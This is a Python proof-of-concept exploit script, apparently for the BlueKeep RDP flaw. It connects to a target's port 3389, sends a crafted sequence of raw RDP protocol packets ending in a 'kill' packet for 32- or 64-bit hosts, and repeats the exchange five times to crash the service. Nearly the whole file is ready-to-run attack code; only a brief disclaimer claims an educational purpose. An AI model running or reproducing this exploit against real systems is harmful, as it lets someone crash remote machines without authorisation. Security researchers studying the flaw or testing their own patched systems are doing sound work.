import socket, sys, struct
from OpenSSL import SSL
from impacket.structure import Structure

# I'm not responsible for what you use this to accomplish and should only be used for education purposes

# Could clean these up since I don't even use them
class TPKT(Structure):
	commonHdr = (
		('Version','B=3'),
		('Reserved','B=0'),
		('Length','>H=len(TPDU)+4'),
		('_TPDU','_-TPDU','self["Length"]-4'),
		('TPDU',':=""'),
	)

class TPDU(Structure):
	commonHdr = (
		('LengthIndicator','B=len(VariablePart)+1'),
		('Code','B=0'),
		('VariablePart',':=""'),
	)
	def __init__(self, data = None):
		Structure.__init__(self,data)
		self['VariablePart']=''

class CR_TPDU(Structure):
	commonHdr = (
		('DST-REF','<H=0'),
		('SRC-REF','<H=0'),
		('CLASS-OPTION','B=0'),
		('Type','B=0'),
		('Flags','B=0'),
		('Length','<H=8'),
	)

class DATA_TPDU(Structure):
	commonHdr = (
		('EOT','B=0x80'),
		('UserData',':=""'),
	)
	def __init__(self, data = None):
		Structure.__init__(self,data)
		self['UserData'] =''

class RDP_NEG_REQ(CR_TPDU):
	structure = (
		('requestedProtocols','<L'),
	)
	def __init__(self,data=None):
		CR_TPDU.__init__(self,data)
		if data is None:
			self['Type'] = 1

def send_init_packets(host):
	tpkt = TPKT()
	tpdu = TPDU()
	rdp_neg = RDP_NEG_REQ()
	rdp_neg['Type'] = 1
	rdp_neg['requestedProtocols'] = 1
	tpdu['VariablePart'] = rdp_neg.getData()
	tpdu['Code'] = 0xe0
	tpkt['TPDU'] = tpdu.getData()
	s = socket.socket()
	s.connect((host, 3389))
	s.sendall(tpkt.getData())
	s.recv(8192)
	ctx = SSL.Context(SSL.TLSv1_METHOD)
	tls = SSL.Connection(ctx,s)
	tls.set_connect_state()
	tls.do_handshake()
	return tls

# This can be fixed length now buttfuckit
def send_client_data(tls):
	p = "\x03\x00\x01\xca\x02\xf0\x80\x7f\x65\x82\x07\xc2\x04\x01\x01\x04\x01\x01\x01\x01\xff\x30\x19\x02\x01\x22\x02\x01\x02\x02\x01\x00\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x02\xff\xff\x02\x01\x02\x30\x19\x02\x01\x01\x02\x01\x01\x02\x01\x01\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x02\x04\x20\x02\x01\x02\x30\x1c\x02\x02\xff\xff\x02\x02\xfc\x17\x02\x02\xff\xff\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x02\xff\xff\x02\x01\x02\x04\x82\x01\x61\x00\x05\x00\x14\x7c\x00\x01\x81\x48\x00\x08\x00\x10\x00\x01\xc0\x00\x44\x75\x63\x61\x81\x34\x01\xc0\xea\x00\x0a\x00\x08\x00\x80\x07\x38\x04\x01\xca\x03\xaa\x09\x04\x00\x00\xee\x42\x00\x00\x44\x00\x45\x00\x53\x00\x4b\x00\x54\x00\x4f\x00\x50\x00\x2d\x00\x46\x00\x38\x00\x34\x00\x30\x00\x47\x00\x49\x00\x4b\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xca\x01\x00\x00\x00\x00\x00\x18\x00\x0f\x00\xaf\x07\x62\x00\x63\x00\x37\x00\x38\x00\x65\x00\x66\x00\x36\x00\x33\x00\x2d\x00\x39\x00\x64\x00\x33\x00\x33\x00\x2d\x00\x34\x00\x31\x00\x39\x38\x00\x38\x00\x2d\x00\x39\x00\x32\x00\x63\x00\x66\x00\x2d\x00\x00\x31\x00\x62\x00\x32\x00\x64\x00\x61\x00\x42\x42\x42\x42\x07\x00\x01\x00\x00\x00\x56\x02\x00\x00\x50\x01\x00\x00\x00\x00\x64\x00\x00\x00\x64\x00\x00\x00\x04\xc0\x0c\x00\x15\x00\x00\x00\x00\x00\x00\x00\x02\xc0\x0c\x00\x1b\x00\x00\x00\x00\x00\x00\x00\x03\xc0\x38\x00\x04\x00\x00\x00\x72\x64\x70\x73\x6e\x64\x00\x00\x0f\x00\x00\xc0\x63\x6c\x69\x70\x72\x64\x72\x00\x00\x00\xa0\xc0\x64\x72\x64\x79\x6e\x76\x63\x00\x00\x00\x80\xc0\x4d\x53\x5f\x54\x31\x32\x30\x00\x00\x00\x00\x00"
	size0 = struct.pack(">h", len(p))
	size1 = struct.pack(">h", len(p)-12)
	size2 = struct.pack(">h", len(p)-109)
	size3 = struct.pack(">h", len(p)-118)
	size4 = struct.pack(">h", len(p)-132)
	size5 = struct.pack(">h", len(p)-390)
	ba = bytearray()
	ba.extend(map(ord, p))
	ba[2] = size0[0]
	ba[3] = size0[1]
	ba[10] = size1[0]
	ba[11] = size1[1]
	ba[107] = size2[0]
	ba[108] = size2[1]
	ba[116] = 0x81
	ba[117] = size3[1] 
	ba[130] = 0x81
	ba[131] = size4[1]
	ba[392] = size5[1]
	tls.sendall(bytes(ba))
	tls.recv(8192)

def send_client_info(tls):
	p = b"\x03\x00\x01\x61\x02\xf0\x80\x64\x00\x07\x03\xeb\x70\x81\x52\x40\x00\xa1\xa5\x09\x04\x09\x04\xbb\x47\x03\x00\x00\x00\x0e\x00\x08\x00\x00\x00\x00\x00\x00\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00\x74\x00\x65\x00\x73\x00\x74\x00\x00\x00\x00\x00\x00\x00\x02\x00\x1c\x00\x31\x00\x39\x00\x32\x00\x2e\x00\x41\x41\x41\x00\x38\x00\x2e\x00\x32\x00\x33\x00\x32\x00\x2e\x00\x31\x00\x00\x00\x40\x00\x43\x00\x3a\x00\x5c\x00\x57\x00\x49\x00\x4e\x00\x41\x41\x41\x00\x57\x00\x53\x00\x5c\x00\x73\x00\x79\x00\x73\x00\x74\x00\x65\x00\x6d\x00\x33\x00\x32\x00\x5c\x00\x6d\x00\x73\x00\x74\x00\x73\x00\x63\x00\x61\x00\x78\x00\x2e\x00\x64\x00\x6c\x00\x6c\x00\x00\x00\xa4\x01\x00\x00\x4d\x00\x6f\x00\x75\x00\x6e\x00\x74\x00\x61\x00\x69\x00\x6e\x00\x20\x00\x53\x00\x74\x00\x61\x00\x6e\x00\x64\x00\x61\x00\x72\x00\x64\x00\x20\x00\x54\x00\x69\x00\x6d\x00\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4d\x00\x6f\x00\x75\x00\x6e\x00\x74\x00\x61\x00\x69\x00\x6e\x00\x20\x00\x44\x00\x61\x00\x79\x00\x6c\x00\x69\x00\x67\x00\x68\x00\x74\x00\x20\x00\x54\x00\x69\x00\x6d\x00\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x02\x00\x02\x00\x00\x00\x00\x00\x00\x00\xc4\xff\xff\xff\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\x64\x00\x00\x00"
	tls.sendall(p)

def send_channel_packets(tls):
	p1 = b"\x03\x00\x00\x0c\x02\xf0\x80\x04\x01\x00\x01\x00"
	tls.sendall(p1)
	p2 = b"\x03\x00\x00\x08\x02\xf0\x80\x28"
	tls.sendall(p2)
	tls.recv(1024)
	p4 = b"\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x07\x03\xeb"
	tls.sendall(p4)
	tls.recv(1024)
	p5 = b"\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x07\x03\xec"
	tls.sendall(p5)
	tls.recv(1024)
	p6 = b"\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x07\x03\xed"
	tls.sendall(p6)
	tls.recv(1024)
	p7 = b"\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x07\x03\xee"
	tls.sendall(p7)
	tls.recv(1024)
	p8 = b"\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x07\x03\xef"
	tls.sendall(p8)
	tls.recv(1024)

def send_confirm_active(tls, shareid):
	p = "\x03\x00\x02\x63\x02\xf0\x80\x64\x00\x07\x03\xeb\x70\x82\x54\x54\x02\x13\x00\xf0\x03\xea\x03\x01\x00\xea\x03\x06\x00\x3e\x02\x4d\x53\x54\x53\x43\x00\x17\x00\x00\x00\x01\x00\x18\x00\x01\x00\x03\x00\x00\x02\x00\x00\x00\x00\x1d\x04\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x1c\x00\x20\x00\x01\x00\x01\x00\x01\x00\x80\x07\x38\x04\x00\x00\x01\x00\x01\x00\x00\x1a\x01\x00\x00\x00\x03\x00\x58\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x14\x00\x00\x00\x01\x00\x00\x00\xaa\x00\x01\x01\x01\x01\x01\x00\x00\x01\x01\x01\x00\x01\x00\x00\x00\x01\x01\x01\x01\x01\x01\x01\x01\x00\x01\x01\x01\x00\x00\x00\x00\x00\xa1\x06\x06\x00\x00\x00\x00\x00\x00\x84\x03\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x13\x00\x28\x00\x03\x00\x00\x03\x78\x00\x00\x00\x78\x00\x00\x00\xfc\x09\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x00\x08\x00\x06\x00\x00\x00\x07\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x0c\x00\x00\x00\x00\x00\x02\x00\x02\x00\x08\x00\x0a\x00\x01\x00\x14\x00\x15\x00\x09\x00\x08\x00\x00\x00\x00\x00\x0d\x00\x58\x00\x91\x00\x20\x00\x09\x04\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x08\x00\x01\x00\x00\x00\x0e\x00\x08\x00\x01\x00\x00\x00\x10\x00\x34\x00\xfe\x00\x04\x00\xfe\x00\x04\x00\xfe\x00\x08\x00\xfe\x00\x08\x00\xfe\x00\x10\x00\xfe\x00\x20\x00\xfe\x00\x40\x00\xfe\x00\x80\x00\xfe\x00\x00\x01\x40\x00\x00\x08\x00\x01\x00\x01\x03\x00\x00\x00\x0f\x00\x08\x00\x01\x00\x00\x00\x11\x00\x0c\x00\x01\x00\x00\x00\x00\x28\x64\x00\x14\x00\x0c\x00\x01\x00\x00\x00\x00\x00\x00\x00\x15\x00\x0c\x00\x02\x00\x00\x00\x00\x0a\x00\x01\x1a\x00\x08\x00\xaf\x94\x00\x00\x1c\x00\x0c\x00\x12\x00\x00\x00\x00\x00\x00\x00\x1b\x00\x06\x00\x01\x00\x1e\x00\x08\x00\x01\x00\x00\x00\x18\x00\x0b\x00\x02\x00\x00\x00\x03\x0c\x00\x1d\x00\x5f\x00\x02\xb9\x1b\x8d\xca\x0f\x00\x4f\x15\x58\x9f\xae\x2d\x1a\x87\xe2\xd6\x01\x03\x00\x01\x01\x03\xd4\xcc\x44\x27\x8a\x9d\x74\x4e\x80\x3c\x0e\xcb\xee\xa1\x9c\x54\x05\x31\x00\x31\x00\x00\x00\x01\x00\x00\x00\x25\x00\x00\x00\xc0\xcb\x08\x00\x00\x00\x01\x00\xc1\xcb\x1d\x00\x00\x00\x01\xc0\xcf\x02\x00\x08\x00\x00\x01\x40\x00\x02\x01\x01\x01\x00\x01\x40\x00\x02\x01\x01\x04"
	ba = bytearray()
	ba.extend(map(ord, p))
	tls.sendall(bytes(ba))

def send_establish_session(tls):
	p = b"\x03\x00\x00\x24\x02\xf0\x80\x64\x00\x07\x03\xeb\x70\x16\x16\x00\x17\x00\xf0\x03\xea\x03\x01\x00\x00\x01\x08\x00\x1f\x00\x00\x00\x01\x00\xea\x03"
	tls.sendall(p)
	p = b"\x03\x00\x00\x28\x02\xf0\x80\x64\x00\x07\x03\xeb\x70\x1a\x1a\x00\x17\x00\xf0\x03\xea\x03\x01\x00\x00\x01\x0c\x00\x14\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00"
	tls.sendall(p)
	p = b"\x03\x00\x00\x28\x02\xf0\x80\x64\x00\x07\x03\xeb\x70\x1a\x1a\x00\x17\x00\xf0\x03\xea\x03\x01\x00\x00\x01\x0c\x00\x14\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
	tls.sendall(p)
	p = b"\x03\x00\x05\x81\x02\xf0\x80\x64\x00\x07\x03\xeb\x70\x85\x72\x72\x05\x17\x00\xf0\x03\xea\x03\x01\x00\x00\x01\x00\x00\x2b\x00\x00\x00\x00\x00\x00\x00\xa9\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa9\x00\x00\x00\x00\x00\x02\x00\x00\x00\xa3\xce\x20\x35\xdb\x94\xa5\xe6\x0d\xa3\x8c\xfb\x64\xb7\x63\xca\xe7\x9a\x84\xc1\x0d\x67\xb7\x91\x76\x71\x21\xf9\x67\x96\xc0\xa2\x77\x5a\xd8\xb2\x74\x4f\x30\x35\x2b\xe7\xb0\xd2\xfd\x81\x90\x1a\x8f\xd5\x5e\xee\x5a\x6d\xcb\xea\x2f\xa5\x2b\x06\xe9\x0b\x0b\xa6\xad\x01\x2f\x7a\x0b\x7c\xff\x89\xd3\xa3\xe1\xf8\x00\x96\xa6\x8d\x9a\x42\xfc\xab\x14\x05\x8f\x16\xde\xc8\x05\xba\xa0\xa8\xed\x30\xd8\x67\x82\xd7\x9f\x84\xc3\x38\x27\xda\x61\xe3\xa8\xc3\x65\xe6\xec\x0c\xf6\x36\x24\xb2\x0b\xa6\x17\x1f\x46\x30\x16\xc7\x73\x60\x14\xb5\xf1\x3a\x3c\x95\x7d\x7d\x2f\x74\x7e\x56\xff\x9c\xe0\x01\x32\x9d\xf2\xd9\x35\x5e\x95\x78\x2f\xd5\x15\x6c\x18\x34\x0f\x43\xd7\x2b\x97\xa9\xb4\x28\xf4\x73\x6c\x16\xdb\x43\xd7\xe5\x58\x0c\x5a\x03\xe3\x73\x58\xd7\xd9\x76\xc2\xfe\x0b\xd7\xf4\x12\x43\x1b\x70\x6d\x74\xc2\x3d\xf1\x26\x60\x58\x80\x31\x07\x0e\x85\xa3\x95\xf8\x93\x76\x99\x9f\xec\xa0\xd4\x95\x5b\x05\xfa\x4f\xdf\x77\x8a\x7c\x29\x9f\x0b\x4f\xa1\xcb\xfa\x95\x66\xba\x47\xe3\xb0\x44\xdf\x83\x03\x44\x24\xf4\x1e\xf2\xe5\xcb\xa9\x53\x04\xc2\x76\xcb\x4d\xc6\xc2\xd4\x3f\xd3\x8c\xb3\x7c\xf3\xaa\xf3\x93\xfe\x25\xbd\x32\x7d\x48\x6e\x93\x96\x68\xe5\x18\x2b\xea\x84\x25\x69\x02\xa5\x38\x65\x6f\x0f\x9f\xf6\xa1\x3a\x1d\x22\x9d\x3f\x6d\xe0\x4c\xee\x8b\x24\xf0\xdc\xff\x70\x52\xa7\x0d\xf9\x52\x8a\x1e\x33\x1a\x30\x11\x15\xd7\xf8\x95\xa9\xbb\x74\x25\x8c\xe3\xe9\x93\x07\x43\xf5\x50\x60\xf7\x96\x2e\xd3\xff\x63\xe0\xe3\x24\xf1\x10\x3d\x8e\x0f\x56\xbc\x2e\xb8\x90\x0c\xfa\x4b\x96\x68\xfe\x59\x68\x21\xd0\xff\x52\xfe\x5c\x7d\x90\xd4\x39\xbe\x47\x9d\x8e\x7a\xaf\x95\x4f\x10\xea\x7b\x7a\xd3\xca\x07\x28\x3e\x4e\x4b\x81\x0e\xf1\x5f\x1f\x8d\xbe\x06\x40\x27\x2f\x4a\x03\x80\x32\x67\x54\x2f\x93\xfd\x25\x5d\x6d\xa0\xad\x23\x45\x72\xff\xd1\xeb\x5b\x51\x75\xa7\x61\xe0\x3f\xe4\xef\xf4\x96\xcd\xa5\x13\x8a\xe6\x52\x74\x70\xbf\xc1\xf9\xfb\x68\x9e\xdd\x72\x8f\xb4\x44\x5f\x3a\xcb\x75\x2a\x20\xa6\x69\xd2\x76\xf9\x57\x46\x2b\x5b\xda\xba\x0f\x9b\xe0\x60\xe1\x8b\x90\x33\x41\x0a\x2d\xc5\x06\xfe\xd0\xf0\xfc\xde\x35\xd4\x1e\xaa\x76\x0b\xae\xf4\xd5\xbd\xfa\xf3\x55\xf5\xc1\x67\x65\x75\x1c\x1d\x5e\xe8\x3a\xfe\x54\x50\x23\x04\xae\x2e\x71\xc2\x76\x97\xe6\x39\xc6\xb2\x25\x87\x92\x63\x52\x61\xd1\x6c\x07\xc1\x1c\x00\x30\x0d\xa7\x2f\x55\xa3\x4f\x23\xb2\x39\xc7\x04\x6c\x97\x15\x7a\xd7\x24\x33\x91\x28\x06\xa6\xe7\xc3\x79\x5c\xae\x7f\x50\x54\xc2\x38\x1e\x90\x23\x1d\xd0\xff\x5a\x56\xd6\x12\x91\xd2\x96\xde\xcc\x62\xc8\xee\x9a\x44\x07\xc1\xec\xf7\xb6\xd9\x9c\xfe\x30\x1c\xdd\xb3\x3b\x93\x65\x3c\xb4\x80\xfb\xe3\x87\xf0\xee\x42\xd8\xcf\x08\x98\x4d\xe7\x6b\x99\x0a\x43\xed\x13\x72\x90\xa9\x67\xfd\x3c\x63\x36\xec\x55\xfa\xf6\x1f\x35\xe7\x28\xf3\x87\xa6\xce\x2e\x34\xaa\x0d\xb2\xfe\x17\x18\xa2\x0c\x4e\x5f\xf0\xd1\x98\x62\x4a\x2e\x0e\xb0\x8d\xb1\x7f\x32\x52\x8e\x87\xc9\x68\x7c\x0c\xef\xee\x88\xae\x74\x2a\x33\xff\x4b\x4d\xc5\xe5\x18\x38\x74\xc7\x28\x83\xf7\x72\x87\xfc\x79\xfb\x3e\xce\xd0\x51\x13\x2d\x7c\xb4\x58\xa2\xe6\x28\x67\x4f\xec\xa6\x81\x6c\xf7\x9a\x29\xa6\x3b\xca\xec\xb8\xa1\x27\x50\xb7\xef\xfc\x81\xbf\x5d\x86\x20\x94\xc0\x1a\x0c\x41\x50\xa9\x5e\x10\x4a\x82\xf1\x74\x1f\x78\x21\xf5\x70\x61\x24\x00\x3d\x47\x5f\xf3\x25\x80\x3c\x4b\xea\xa3\xf4\x77\xea\xa1\x42\x1a\x17\x0f\x6d\xa8\x35\x9e\x91\x26\x34\x43\x04\xc6\xc6\x5b\x21\x7d\x8c\xc7\x22\x91\x7b\x2c\x2d\x2f\xd6\x7e\xa5\x52\xa8\x08\x80\xeb\x60\xd1\x44\x09\x8e\x3c\xa1\xaa\x67\x60\x0a\x26\xc6\xb5\xc6\x79\xa6\x4f\x8b\x8c\x25\x5c\xf1\x0b\x23\xf4\xd8\xa6\x6d\xf1\x91\x78\xf9\xe5\x2a\x50\x2f\x5a\x44\x22\xd9\x19\x5c\xaf\xd6\xac\x97\xa2\xf8\x0d\x0c\xe3\xdd\x88\x48\x98\x28\x0b\x8b\xbd\x76\xdc\xde\xca\xe2\xc2\x4a\x87\x50\xd4\x8c\x77\x5a\xd8\xb2\x74\x4f\x30\x35\xbf\x28\xae\xd9\xa2\x98\xa5\xbc\x60\xca\xb8\x90\x4d\x20\x46\xd9\x8a\x1a\x30\x01\x8b\x38\x63\x1a\x57\x09\x51\x46\x95\x9b\xd8\x80\x0c\xb0\x77\x24\xbf\x2b\xd3\x57\x22\xd9\x19\x5c\xaf\xd6\xac\x97\xa2\xf8\x0d\x0c\xe3\xdd\x88\x48\x98\x28\x0b\x8b\xbd\x76\xdc\xde\xca\xe2\xc2\x4a\x87\x50\xd4\x8c\x56\x92\x38\xed\x6b\x9b\x5b\x1f\xba\x53\xa1\x0e\xf7\x75\x10\x53\x22\x4c\x0a\x75\x88\x54\x69\x3f\x3b\xf3\x18\x67\x6b\x0f\x19\xd1\x00\x25\x86\xcd\xa8\xd9\xdd\x1d\x8d\x26\x87\x54\xd9\x79\xc0\x74\x65\x90\xd7\x33\x32\xaf\xba\x9d\x5a\xd5\x6c\x7c\xa1\x47\xe1\x49\x6e\x1c\xce\x9f\x62\xaa\x26\x16\x3f\x3c\xec\x5b\x49\xe5\xc0\x60\xd4\xbe\xa7\x88\xbc\xa1\x9f\x29\x71\x8c\xeb\x69\xf8\x73\xfb\xaf\x29\xaa\x40\x1b\xe5\x92\xd2\x77\xa7\x2b\xfb\xb6\x77\xb7\x31\xfb\xdc\x1e\x63\x63\x7d\xf2\xfe\x3c\x6a\xba\x0b\x20\xcb\x9d\x64\xb8\x31\x14\xe2\x70\x07\x2c\xdf\x9c\x6f\xb5\x3a\xc4\xd5\xb5\xc9\x3e\x9a\xd7\xd5\x30\xdc\x0e\x19\x89\xc6\x08\x88\xe1\xca\x81\xa6\x28\xdd\x9c\x74\x05\x11\xe7\xe1\xcc\xbc\xc7\x76\xdd\x55\xe2\xcc\xc2\xcb\xd3\xb6\x48\x01\xdd\xff\xba\xca\x31\xab\x26\x44\x1c\xdc\x06\x01\xdf\xf2\x90\x50\xb8\x6b\x8f\xe8\x29\xf0\xba\xec\xfb\x2d\xfd\x7a\xfc\x7f\x57\xbd\xea\x90\xf7\xcf\x92\x1e\xc4\x20\xd0\xb6\x9f\xd6\xdc\xa1\x82\xa9\x6c\x5e\x3e\x83\x41\x57\x73\xe9\xe7\x5a\x3f\xda\x24\x4f\x73\x5e\xf4\xe0\x92\x24\xbd\x0b\xd0\x3c\x49\x96\xb5\xb5\x05\x32\xcb\x58\x1d\x6f\x97\x51\xee\x0c\xdc\x0b\x2a\x60\xef\x97\x3e\x5a\x30\x81\x15\x91\xcf\x11\x07\x25\x2c\x41\xdb\x70\x72\xe1\x75\xf6\xa5\xff\xe8\x44\xe7\x03\xe3\x61\xaa\xdb\xe0\x07\x3d\x07\x0b\xe3\x5c\x09\xa9\x5e\x10\xfd\xcf\x74\x9e\x23\xf1\x30\x86\x16\xef\x25\x4e\xfe\xa4\x93\xa5\x80\x0a\x01\x39\xcc\x11\x7a\x6e\x94\x22\x5b\xd8\xc6\xc9\xa8\xdf\x13\x96\xb3\x91\x33\x6e\x87\xbb\x94\x63\x2d\x88\x64\xa7\x58\x89\xda\xdc\x7f\x2a\xe3\xa1\x66\xe5\xc8\x7f\xc2\xdb\xc7\x7d\x2f\xa9\x46\x28\x45\x69\xbc\xac\x9f\x85\x9e\xb0\x9f\x9a\x49\xb4\xb1\xcb"
	tls.sendall(p)
	p = b"\x03\x00\x00\x28\x02\xf0\x80\x64\x00\x07\x03\xeb\x70\x1a\x1a\x00\x17\x00\xf0\x03\xea\x03\x01\x00\x00\x01\x00\x00\x27\x00\x00\x00\x00\x00\x00\x00\x03\x00\x32\x00"
	tls.sendall(p)

def send_kill_packet(tls, arch):
	if arch == "32":
		p = b"\x03\x00\x00\x2e\x02\xf0\x80\x64\x00\x07\x03\xef\x70\x14\x0c\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	elif arch == "64":
		p = b"\x03\x00\x00\x2e\x02\xf0\x80\x64\x00\x07\x03\xef\x70\x14\x0c\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	else:
		print("Make the second arguement '32' or '64' without quotes")
		sys.exit()
	tls.sendall(p)

def terminate_connection(tls):
	p = b"\x03\x00\x00\x09\x02\xf0\x80\x21\x80"
	tls.sendall(p)

def main(args):
	tls = send_init_packets(args[1])

	send_client_data(tls)
	print("[+] ClientData Packet Sent")

	send_channel_packets(tls)
	print("[+] ChannelJoin/ErectDomain/AttachUser Sent")

	send_client_info(tls)
	print("[+] ClientInfo Packet Sent")

	tls.recv(8192)
	tls.recv(8192)

	send_confirm_active(tls, None)
	print("[+] ConfirmActive Packet Sent")

	send_establish_session(tls)
	print("[+] Session Established")

	send_kill_packet(tls, args[2])
	terminate_connection(tls)
	print("[+] Vuln Should Trigger")

if __name__ == '__main__':
	if len(sys.argv) != 3:
		print("Usage: python poc.py 127.0.0.1 64")
		sys.exit()

	elif sys.argv[2] == '32' or '64':
		# I've had to send the packets 5 times for hosts that havent
		# had a terminal session since their last reboot. I think
		# I know why but atm its just easier to send the exchange
		# 5 times and it'll crash eventually. Most of the time its
		# the first time though.
		for _ in range(5):
			main(sys.argv)

	else:
		print("Usage: python poc.py 127.0.0.1 64")
		sys.exit()
